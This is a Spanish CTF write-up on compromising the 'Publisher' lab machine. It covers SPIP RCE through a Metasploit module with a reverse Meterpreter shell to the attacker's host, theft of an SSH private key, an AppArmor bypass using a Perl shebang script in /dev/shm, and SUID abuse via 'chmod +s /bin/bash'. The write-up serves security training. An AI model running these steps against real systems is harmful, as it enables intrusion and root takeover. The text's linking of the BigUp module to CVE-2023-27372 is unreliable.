---
tags:
  - Nmap
  - web
  - SUID
  - metasploit
  - feroxbuster
  - Linux
  - Escalada_Privilegios
  - AppArmor
  - shebang
  - Perl
  - Docker
  - bypass
  - /dev/shm
  - CVE-2023-27372
  - CMS
---


# Introducción

La máquina **Publisher** representa un entorno vulnerable diseñado para poner en práctica distintas fases de un ataque real, desde el reconocimiento inicial hasta la obtención de privilegios de superusuario. A lo largo de su explotación, se combinan técnicas clásicas y modernas, entre ellas la enumeración de servicios, la explotación de vulnerabilidades web conocidas, el abuso de credenciales expuestas y la manipulación de binarios SUID mal configurados.

Durante el análisis, se descubrió que el servidor corría el CMS **SPIP** vulnerable a **CVE-2023-27372**, una vulnerabilidad crítica de deserialización insegura que permite ejecución remota de código sin autenticación. Mediante esta falla fue posible obtener acceso inicial como el usuario restringido `www-data`, lo cual sirvió de punto de entrada para el compromiso del sistema.

Posteriormente, se encontró en el directorio personal del usuario principal la clave privada SSH, lo que permitió autenticarse como **think** y obtener un acceso más estable. Finalmente, la escalada a **root** se consiguió explotando un binario SUID mal configurado (`/usr/sbin/run_container`) que ejecutaba un script world-writable bajo privilegios de root. Aunque la shell estaba confinada por un perfil de **AppArmor**, se empleó un **AppArmor bypass mediante un script Perl con shebang** en `/dev/shm`, lo que permitió modificar el script vulnerable y elevar privilegios hasta el máximo nivel.

Este writeup documenta cada una de estas fases de forma detallada, explicando las técnicas utilizadas y los conceptos de seguridad involucrados, con el fin de mostrar cómo un atacante podría aprovechar configuraciones débiles y vulnerabilidades conocidas para comprometer completamente un sistema.

## Reconocimiento 

Para iniciar el proceso de reconocimiento, realizamos un escaneo exhaustivo con **Nmap** con el objetivo de identificar los servicios activos, sus versiones y posibles vectores de ataque en el host objetivo.

Ejecutamos el siguiente comando:

```bash
(zikuta㉿zikuta)-[~/Desktop/publisher]
└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.201.21.82 -oN nmap.txt       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 06:37 CDT
Nmap scan report for 10.201.21.82
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:05:7c:27:27:03:b3:55:2a:ab:0f:53:43:0d:0a:b2 (RSA)
|   256 01:5b:b0:ee:ca:a8:22:da:c0:53:d5:bd:5c:40:13:7d (ECDSA)
|_  256 eb:c0:58:f1:c8:c0:e9:dc:36:56:ac:cb:81:fb:70:fa (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Del escaneo se pudo observar que el host tiene los siguientes servicios abiertos y detectables:

- **SSH (22/tcp)**: OpenSSH 8.2p1 sobre Ubuntu, lo que permite conexiones remotas seguras.
- **HTTP (80/tcp)**: Servidor Apache 2.4.41, con un sitio web titulado _Publisher's Pulse: SPIP Insights & Tips_.
Estos hallazgos nos proporcionan la base para planificar fases posteriores de análisis y explotación



### Acceso inicial al sitio

Tras el escaneo inicial con Nmap ya tenemos dos servicios claros: **SSH (22)** y **HTTP (80)**. Dado que el título de la página en el puerto 80 mencionaba explícitamente **SPIP** (_Publisher's Pulse: SPIP Insights & Tips_), la prioridad era profundizar en el servicio web, porque es un CMS y, por experiencia, suele ser un vector de entrada más accesible que atacar directamente SSH.

Al abrir la dirección en el navegador (`http://10.201.21.82/`), encontramos una página de blog con un diseño típico de CMS, encabezados y artículos. No había nada evidente a simple vista como formularios de login o subidas de archivos.

En este punto, la siguiente técnica natural es aplicar **fuzzing de directorios**: un escaneo automatizado que prueba listas de nombres comunes para descubrir rutas ocultas, paneles administrativos, archivos de configuración, copias de seguridad, etc.


```bash
(zikuta㉿zikuta)-[~/Desktop/publisher]
└─$ feroxbuster -u http://10.201.21.82 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.201.21.82
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       32l      224w    17917c http://10.201.21.82/images/ads.jpg
301      GET        9l       28w      313c http://10.201.21.82/images => http://10.201.21.82/images/
200      GET      142l      610w    69796c http://10.201.21.82/images/image_02.jpg
200      GET       69l       74w     4051c http://10.201.21.82/images/comment_icon.jpg
200      GET      237l     1368w   110318c http://10.201.21.82/images/image_01.jpg
200      GET      132l     1196w   102457c http://10.201.21.82/images/top_bg.jpg
200      GET      354l      770w     5959c http://10.201.21.82/style.css
200      GET      150l      766w     8686c http://10.201.21.82/
200      GET        9l       69w     8953c http://10.201.21.82/images/menu_bg.jpg
200      GET       17l       96w     5807c http://10.201.21.82/images/templatmeo_column_two_bg.jpg
200      GET        8l       45w     3539c http://10.201.21.82/images/180_column_bg.jpg
200      GET        7l       13w      379c http://10.201.21.82/images/menu_bg_repeat.jpg
200      GET       81l      462w    49772c http://10.201.21.82/images/bottom_panel_bg.jpg
200      GET      109l      602w    53555c http://10.201.21.82/images/logo.jpg
301      GET        9l       28w      311c http://10.201.21.82/spip => http://10.201.21.82/spip/
200      GET        3l       13w       83c http://10.201.21.82/spip/local/remove.txt
200      GET        1l        6w      431c http://10.201.21.82/spip/local/config.txt
200      GET        4l       23w      187c http://10.201.21.82/spip/local/CACHEDIR.TAG
200      GET       59l      166w     5830c http://10.201.21.82/spip/local/cache-css/cssdyn-
```

### Resultados obtenidos

El escaneo arrojó una **lista extensa de directorios** y archivos, muchos de ellos generados automáticamente por el CMS (SPIP) o por Apache. Sin embargo, al revisarlos manualmente ninguno resultó de interés práctico para la explotación:

- Directorios estáticos comunes (`/css/`, `/js/`, `/img/`) → solo contenían recursos del sitio.
- Directorios internos de SPIP (`/local/`, `/IMG/`, `/squelettes/`) → accesibles pero con contenido irrelevante o vacío desde la perspectiva del atacante.
- Ningún archivo de configuración sensible ni panel de administración accesible fue descubierto mediante el fuzzing.

## Fase de explotación web — RCE en SPIP BigUp


Tras el reconocimiento y fuzzing, que confirmaron que el servidor ejecutaba **SPIP** pero no mostraron directorios interesantes, se pasó directamente a buscar vulnerabilidades conocidas en este CMS.

### Búsqueda de módulos en Metasploit

```bash
msf6 > search spip

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
   1     \_ target: PHP In-Memory                       .                .          .      .
   2     \_ target: Unix/Linux Command Shell            .                .          .      .
   3     \_ target: Windows Command Shell               .                .          .      .
   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
   5     \_ target: PHP In-Memory                       .                .          .      .
   6     \_ target: Unix/Linux Command Shell            .                .          .      .
   7     \_ target: Windows Command Shell               .                .          .      .
   8   exploit/multi/http/spip_connect_exec             2012-07-04       excellent  Yes    SPIP connect Parameter PHP Injection
   9     \_ target: PHP In-Memory                       .                .          .      .
   10    \_ target: Unix/Linux Command Shell            .                .          .      .
   11    \_ target: Windows Command Shell               .                .          .      .
   12  exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
   13    \_ target: PHP In-Memory                       .                .          .      .
   14    \_ target: Unix/Linux Command Shell            .                .          .      .
   15    \_ target: Windows Command Shell               .                .          .      .
```

Utilizaremos el modulo **“SPIP BigUp Plugin Unauthenticated RCE”** 

Esto significa que el módulo aprovecha una vulnerabilidad crítica en el **plugin BigUp** de SPIP que permite **ejecutar comandos remotos sin necesidad de autenticación**.

### Contexto y descripción general

La vulnerabilidad **CVE-2023-27372** afecta a instalaciones de SPIP en versiones **anteriores a la 4.2.1** (incluyendo ramas 3.2, 4.0, 4.1 y 4.2). La causa subyacente es un **manejo inadecuado de valores serializados en formularios de la interfaz pública**, lo que permite ejecución de código remoto (RCE) sin necesidad de autenticación.

Desde el punto de vista de Severidad, se clasifica como **CRITICAL**, con un puntaje **CVSS 3.1 de 9.8** — lo que refleja acceso desde red (AV:N), baja complejidad de ataque (AC:L), sin privilegios requeridos (PR:N) ni interacción del usuario (UI:N), y alto impacto en confidencialidad, integridad y disponibilidad (C:H/I:H/A:H).

### ¿Qué significa “serialización mal manejada”?

En SPIP, varios formularios (como el de “restablecer contraseña” u otros procesos públicos) usan campos que incluyen datos **serializados** en PHP. La serialización es una forma de codificación que representa estructuras (strings, arrays, objetos) como texto, incluyendo su longitud y contenido. Por ejemplo:

```css
s:20:"some-string-data";
```

Aquí, `s:` indica que es un string, `20` indica la longitud, y luego el contenido entre comillas.

El problema ocurre cuando SPIP **acepta** estos valores serializados y luego los **deserializa sin validarlos adecuadamente**, permitiendo que un atacante modifique la longitud declarada y el contenido, inyectando código PHP malicioso. Al deserializar, se interpreta como datos legítimos y puede ejecutarse directamente.

Esto es una forma de explotación de **deserialización insegura** (CWE-502), muy peligrosa en PHP y otros lenguajes.


### Flujo típico de ataque

1. El atacante hace una petición HTTP al endpoint (por ejemplo `spip.php?page=spip_pass`) que contiene un formulario con campos como `formulaire_action_args` y `oubli`.
2. El formulario incluye un token de anti-CSRF (`formulaire_action_args`) y un campo serializado en `oubli`.
3. No hay validación estricta sobre el contenido serializado: el atacante puede enviar algo como:

```php-template
s:XX:"<?php system('calc'); ?>";
```

- donde `XX` es la longitud ajustada para coincidir con el contenido real.
- Al procesarse el formulario, SPIP **deserializa esa entrada**, interpretando el contenido PHP en memoria y eventualmente ejecutándolo (por ejemplo, al incluirlo en un script o evaluación dinámica). De esta forma, se consigue RCE sin autenticación.

### Impacto real de la vulnerabilidad

Dado que se puede ejecutar código arbitrario desde la interfaz pública, un atacante puede comprometer completamente el servidor, escribir ficheros, obtener credenciales, desplegar puertas traseras o incluso pivotar a otros sistemas internos. El impacto es crítico, y por eso fue urgente la liberación de parches en múltiples ramas y la generación de alertas en Debian/Ubuntu.

#### Explotacion

```bash
msf6 exploit(multi/http/spip_bigup_unauth_rce) > exploit
[*] Started reverse TCP handler on 10.23.120.245:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CK5OtIY6q/6ugXZnjymFQ...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (40004 bytes) to 10.201.21.82
[*] Meterpreter session 1 opened (10.23.120.245:4444 -> 10.201.21.82:37326) at 2025-09-03 06:51:34 -0500
```


Tras ejecutar el exploit `spip_bigup_unauth_rce` en Metasploit, el framework nos reporta que el payload fue entregado correctamente y se estableció una **sesión Meterpreter** con la máquina víctima:

```bash
[*] Meterpreter session 1 opened (10.23.120.245:4444 -> 10.201.21.82:37326)
```

## Limitación del Meterpreter

Aunque la sesión es interactiva, el Meterpreter no siempre permite ejecutar todos los comandos del sistema de manera directa (por ejemplo, `id`, `ls`, `cat`). Para solventar esto, lo habitual es invocar una **shell del sistema operativo** desde Meterpreter con:

```bash
meterpreter > shell
Process 244 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

De esta forma obtenemos acceso a un intérprete de comandos clásico (sh/bash) ejecutándose como el usuario `www-data`.


## Estabilización de la shell (tratamiento TTY)

Las shells iniciales obtenidas en un entorno de explotación suelen ser **limitadas**: no permiten autocompletado, histórico, ni el uso adecuado de atajos de teclado. Para mejorarla, se puede aplicar un “tratamiento” a la TTY. Una técnica práctica es usar el comando `script`, que crea un pseudo-terminal interactivo:

```bash
script -qc /bin/bash /dev/null
www-data@41c976e507f8:/home/think/spip/spip$ 
```

Con esto pasamos de una shell básica a una **TTY interactiva más estable**, que facilita la interacción con el sistema y el uso de herramientas como `nano`, `vim`, o incluso la navegación fluida en directorios.

Ahora nuestra shell muestra un prompt más completo


## Acceso a la user flag

Una vez dentro del servidor, el primer paso típico en un CTF o máquina de práctica es acceder al directorio `/home` para comprobar los usuarios locales. Encontramos un directorio llamado **think**, y dentro de él se ubica el archivo `user.txt`, que contiene la primera flag del reto.

```bash
www-data@41c976e507f8:/home/think$ ls
ls
spip  user.txt
```

De esta forma, confirmamos el **acceso inicial exitoso** y validamos que el exploit funcionó correctamente, otorgándonos control sobre la máquina víctima como usuario restringido.

# Escalada de privilegios — De _www-data_ a _think_

Tras obtener acceso inicial al servidor con el usuario restringido **www-data**, el siguiente objetivo fue **moverse lateralmente hacia una cuenta con más privilegios** dentro del sistema. Para ello, revisamos el contenido del directorio `/home/think`, donde residía el usuario principal.


## Descubrimiento de credenciales – Clave privada SSH

Durante la enumeración, encontramos un directorio oculto `.ssh` en la ruta `/home/think/.ssh/`. Dentro de este directorio se hallaba un archivo crítico: la **clave privada SSH** (`id_rsa`) del usuario _think_.

```bash
find

/.ssh
./.ssh/id_rsa
./.ssh/authorized_keys
./.ssh/id_rsa.pub
./.config
```

Este hallazgo es muy relevante porque permite autenticarse directamente como el usuario _think_, siempre y cuando el archivo tenga los permisos correctos para su uso en un cliente SSH.



## Exportación de la clave a la máquina atacante

Copiamos el contenido de `id_rsa` y lo guardamos en un archivo local en nuestra máquina atacante. Es importante ajustar los permisos del archivo, ya que SSH requiere que las claves privadas tengan permisos restringidos (600) para evitar advertencias de seguridad:

```bash
www-data@41c976e507f8:/home/think$ cat /home/think/.ssh/id_rsa
cat /home/think/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK
uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+9/2ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc
OY8+1CUVX67y4UXrKASf8l7lPKIED24bXj
```

## Conexión como el usuario _think_

Una vez preparada la clave privada, establecimos la conexión SSH directamente al servidor víctima, autenticándonos como el usuario **think**:

```bash
(zikuta㉿zikuta)-[~/Desktop/publisher]
└─$ nano id_rsa      

┌──(zikuta㉿zikuta)-[~/Desktop/publisher]
└─$ chmod 600 id_rsa                                

┌──(zikuta㉿zikuta)-[~/Desktop/publisher]
└─$ ssh -i id_rsa think@10.201.21.82     
Last login: Mon Feb 12 20:24:07 2024 from 192.168.1.13
think@ip-10-201-21-82:~$ 
```

Con esto, confirmamos que la clave privada era válida y logramos acceso interactivo al sistema con la cuenta del usuario _think_.

# Escalada de privilegios – De _think_ a _root_

Tras haber accedido como el usuario **think**, el siguiente paso fue buscar **binarios SUID** que nos pudieran dar una vía de escalada a privilegios.

```bash
think@ip-10-201-21-82:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

	/usr/sbin/run_container

De todos ellos, destacó **`/usr/sbin/run_container`**, un binario SUID que, como su nombre indica, gestiona contenedores Docker.

## Análisis del binario `run_container`

Al ejecutarlo, observamos que en realidad no contiene la lógica directamente, sino que **invoca un script externo ubicado en `/opt/run_container.sh`**:

```bash
think@ip-10-201-17-74:~$ /usr/sbin/run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 1 second

Enter the ID of the container or leave blank to create a new one: 
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container    3) Restart Container  5) Quit
2) Stop Container     4) Create Container
Choose an action for a container: 4
Creating a new container...
9f326370b4ee46e44a8ca8e6adcf5e95cbbf5b18fb2e9f79861fc0efdc737053
docker: Error response from daemon: driver failed programming external connectivity on endpoint zen_shockley (d3c1776f892982559de29d48f3acd84ce551ae9236381d6f36580c1f4209d804): Bind for 0.0.0.0:80 failed: port is already allocated.
```

Esto es un hallazgo muy crítico: si un binario con permisos SUID root llama a un script que podemos quiza modificar, podemos inyectar comandos para que se ejecuten como **root**. 
 
## Descubrimiento de permisos en `/opt/run_container.sh`

Verificamos los permisos del script y encontramos que eran **world-writable (777)**:

```bash
think@ip-10-201-17-74:~$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```

Esto significa que cualquier usuario puede modificarlo. Sin embargo, al intentar escribir directamente sobre él, encontramos una barrera inesperada:

```bash
think@ip-10-201-17-74:~$ echo "/bin/sh" >> /opt/run_container.sh
-ash: /opt/run_container.sh: Permission denied
```

## Restricción: AppArmor en `ash`

El problema radicaba en que nuestro shell por defecto no era `/bin/bash`, sino **`/usr/sbin/ash`**, y este estaba confinado por un perfil de **AppArmor**:

```bash
think@ip-10-201-17-74:~$ echo $SHELL
/usr/sbin/ash
```


## ¿Qué es AppArmor?

AppArmor es un **Módulo de Seguridad en Linux (LSM)**.  
Sirve para **confinar procesos a perfiles de seguridad**.

- Incluso si un binario es SUID root, **AppArmor puede restringirlo**: por ejemplo, no permitir escribir en ciertos directorios, montar sistemas, o ejecutar algunos binarios.
- En contenedores (Docker, LXC, etc.), AppArmor es usado para que **los procesos dentro del contenedor no puedan escapar al host**.

##  ¿Qué es un _AppArmor bypass_?

Un _AppArmor bypass_ es un **método para escapar de las restricciones** que AppArmor aplica.  
Ejemplos típicos:

1. **Montar `/proc` o `/sys` dentro del contenedor** y desde ahí acceder al host.
2. **Abusar de binarios permitidos** (ejemplo: `tar`, `vim`, `less`, etc.) para ejecutar comandos arbitrarios.
3. **Ejecutar Docker con privilegios** → si AppArmor no lo confina correctamente, el contenedor puede tener acceso root al host.

En tu caso, si el script crea un contenedor con privilegios root y sin perfil AppArmor fuerte → **puedes usar ese contenedor para rootear el host**.  
Esto es justo lo que se llama **Docker escape vía AppArmor bypass**.

## Qué significa `/etc/apparmor.d/usr.sbin.ash`

1. **Ubicación de los perfiles AppArmor**:  
    Todos los perfiles de AppArmor se guardan en `/etc/apparmor.d/`.
    
    - Cada archivo define **qué puede y qué no puede hacer un binario**.
    - En este caso, `/etc/apparmor.d/usr.sbin.ash` es el perfil que limita `/usr/sbin/ash`.

**Qué hace un perfil**:

- Restringe acceso a archivos, directorios, sockets, dispositivos.
- Puede impedir que un proceso:
    
    - Sobrescriba scripts SUID (como `/opt/run_container.sh`)
    - Monte sistemas de archivos
    - Ejecute binarios arbitrarios


**Por eso nos sale `Permission denied`** cuando intentas `echo "/bin/sh" >> /opt/run_container.sh`.

- Aunque el archivo es `777` y el binario es SUID, **AppArmor bloquea la operación**.

# ESCALADA DE PRIVILEGIOS

## Entorno / evidencia inicial

Usuario: `think` (uid=1000)  
Shell por defecto: `/usr/sbin/ash`  
Binario interesante: `/usr/sbin/run_container` (SUID, ejecuta `/opt/run_container.sh`)  
Script objetivo: `/opt/run_container.sh`


```bash
ls -la /opt/run_container.sh
# -rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```

El script es propiedad de `root` pero tiene permisos `777` (world-writable): **situación crítica** si ese script se ejecuta con privilegios

## Análisis de AppArmor y por qué no podemos escribir directamente

Al inspeccionar el perfil AppArmor para `ash` (recordemos que la shell por defecto que tenemos es ash) (`/etc/apparmor.d/usr.sbin.ash`) se encontraron reglas que **impiden escritura** en rutas específicas, p. ej.: 

```bash
deny /opt/ r,
deny /opt/** w,
deny /tmp/** w,
deny /var/tmp w,
...
/usr/bin/** mrix,
 /usr/sbin/** mrix,
```

- La regla `deny /opt/** w` (o `deny /tmp/** w`) impide escribir directamente en `/opt/run_container.sh` desde la shell confinada.
- Además las reglas `mrix` sobre `/usr/bin/**` y `/usr/sbin/**` hacen que la política de confinamiento se aplique a binarios ubicados en esos paths (los procesos que ejecutas desde esas rutas pueden heredar el confinamiento).

> Resultado: no podemos modificar `/opt/run_container.sh` directamente desde la shell confinada por AppArmor.


## Objetivo de la explotación

Conseguir ejecutar código como `root` a través de:

1. Encontrar o crear una vía para ejecutar código **fuera del confinamiento** de AppArmor.
2. Desde esa vía, sobrescribir `/opt/run_container.sh` con un comando que, al ejecutarse con el SUID root, habilite un ejecutable con SUID (p.ej. `/bin/bash`).
3. Ejecutar dicho ejecutable SUID para obtener shell con EUID=0.



## Bypass de AppArmor

### Shebang / Perl trick (ejecución directa del intérprete)

Para escapar de esta restricción, se usó una técnica conocida como **AppArmor Shebang Bypass**:

1. Creamos un script en memoria (`/dev/shm`) con un _shebang_ que invoca a Perl:

```bash
echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```

**Qué hace y por qué funciona (explicación clara):**

- El archivo comienza con `#! /usr/bin/perl` (shebang). Cuando ejecutas `/dev/shm/test.pl` directamente, el kernel invoca `/usr/bin/perl` con `test.pl` como argumento.
    
- Dependiendo del perfil AppArmor y de **dónde** está localizado el intérprete o el propio script, es posible que la ejecución directa del intérprete o la ejecución de un binario que **no esté bajo** `/usr/bin` o `/usr/sbin` (por ejemplo una copia en `/dev/shm`) **no** sea sujeta a la misma política restrictiva que la shell confinada `/usr/sbin/ash`.
    
- En esta caja en concreto, `/dev/shm` era escribible y la ejecución directa del script permitió ejecutar `exec "/bin/sh"` y conseguir una shell interactiva **no tan restringida** (es decir, con menos restricciones para acciones como crear archivos fuera de las rutas bloqueadas).

>El shebang hace que el kernel ejecute el intérprete; si consigues ejecutar un intérprete o binario desde una ruta/forma no cubierta por la política restrictiva, consigues _una shell menos confinada_.

### Explotacion

Detectar 

```bash
think@ip-10-201-17-74:~$ echo $SHELL
/usr/sbin/ash
```

Confirmar que `/opt/run_container.sh` es writable (o que la intención es escribirlo)

```bash
think@ip-10-201-17-74:~$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```

Intento directo (falla por AppArmor)

```bash
think@ip-10-201-17-74:~$ echo "/bin/sh" >> /opt/run_container.sh
-ash: /opt/run_container.sh: Permission denied
```

Crear un script en /dev/shm (shebang perl) y ejecutarlo para obtener shell menos restringida

```bash
think@ip-10-201-17-74:~$  echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl
think@ip-10-201-17-74:~$ chmod +x /dev/shm/test.pl
think@ip-10-201-17-74:~$ /dev/shm/test.pl
```

Desde la shell no confinada, sobrescribir el script root con payload

```bash
echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh
```

Esto crea un `/opt/run_container.sh` que, cuando se ejecute como root, pondrá el bit SUID en `/bin/bash`.

```bash
$ /usr/sbin/run_container
```

El SUID ejecuta `/opt/run_container.sh` **con EUID=root**, por tanto `chmod +s /bin/bash` se ejecuta como root. Luego comprobar:

```bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Obtener shell root

```bash
/bin/bash -p
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```


## Explicación 

1. `/usr/sbin/run_container` se ejecuta con privilegios de root (SUID) y llama a `/opt/run_container.sh`

2. `/opt/run_container.sh` era **editable por usuarios normales** → vulnerabilidad.

3. AppArmor impedía la escritura directa en ciertas rutas desde la shell confinada (`ash`).

4. Se usó un _bypass de AppArmor_ creando/ejecutando un script en una ruta no confinada (`/dev/shm`) usando un shebang (`#!/usr/bin/perl`) o copiando un intérprete allí. Esa ejecución proporcionó una shell con menos restricciones (capaz de escribir en `/opt`).

5. Desde esa shell no confinada se sobrescribió `/opt/run_container.sh` con un comando que, cuando el SUID lo ejecutara, iba a cambiar permisos de `/bin/bash` para ponerle SUID.

6. Ejecutando el SUID la acción se hizo como `root`, se puso SUID en `/bin/bash` y al ejecutar `/bin/bash -p` se obtuvo EUID=0 → root.

7. Con Perl Lo que hicimos fue **crear y ejecutar un script en `/dev/shm` (que es un `tmpfs`, es decir RAM)** que lanzó una **nueva shell no tan confinada**. Esa shell seguía siendo del usuario `think` (uid=1000), pero **no estaba sujeta a las mismas restricciones de AppArmor** que tu `ash` inicial, por eso luego podemos escribir en `/opt` y continuar la explotación.


# Tecnicas Utilizadas

| **Fase**                     | **Técnica / Herramienta**                                                  | **Descripción**                                                                                                    |
| ---------------------------- | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **Reconocimiento**           | `nmap -sV -sS -Pn -p- -sC --min-rate 5000`                                 | Escaneo completo de puertos y servicios para identificar vectores de ataque.                                       |
| **Fuzzing web**              | `feroxbuster`                                                              | Enumeración de directorios en el servidor web para localizar rutas interesantes.                                   |
| **Explotación inicial**      | **Metasploit – exploit/multi/http/spip_bigup_unauth_rce** (CVE-2023-27372) | Explotación de vulnerabilidad de deserialización insegura en SPIP (plugin BigUp) → RCE sin autenticación.          |
| **Acceso inicial**           | Meterpreter → `shell`                                                      | Uso de la sesión Meterpreter para obtener una shell interactiva (`www-data`).                                      |
| **Estabilización**           | `script -qc /bin/bash /dev/null`                                           | Tratamiento de TTY para mejorar la interacción con la shell inicial.                                               |
| **Movimiento lateral**       | Lectura de `/home/think/.ssh/id_rsa`                                       | Descubrimiento de la clave privada SSH del usuario _think_.                                                        |
| **Acceso persistente**       | `ssh -i id_rsa think@<IP>`                                                 | Uso de la clave privada exportada para autenticarse como _think_.                                                  |
| **Enumeración local**        | `find / -perm -4000 -type f`                                               | Búsqueda de binarios SUID para identificar vectores de escalada a root.                                            |
| **Escalada de privilegios**  | SUID Abuse – `/usr/sbin/run_container`                                     | Binario root que ejecuta `/opt/run_container.sh` (world-writable).                                                 |
| **Restricción de seguridad** | AppArmor (`/etc/apparmor.d/usr.sbin.ash`)                                  | Descubrimiento de perfil que impedía escribir directamente en `/opt`.                                              |
| **AppArmor Bypass**          | **Shebang Perl trick en `/dev/shm`**                                       | Creación de un script `test.pl` con `#!/usr/bin/perl` para spawnear una shell fuera del confinamiento de AppArmor. |
| **PrivEsc final**            | Modificación de `/opt/run_container.sh` → `chmod +s /bin/bash`             | Al ejecutar el binario SUID, se asignó el bit SUID a `/bin/bash`.                                                  |
| **Root shell**               | `/bin/bash -p`                                                             | Ejecución de bash con privilegios elevados (EUID=0) para obtener root.                                             |





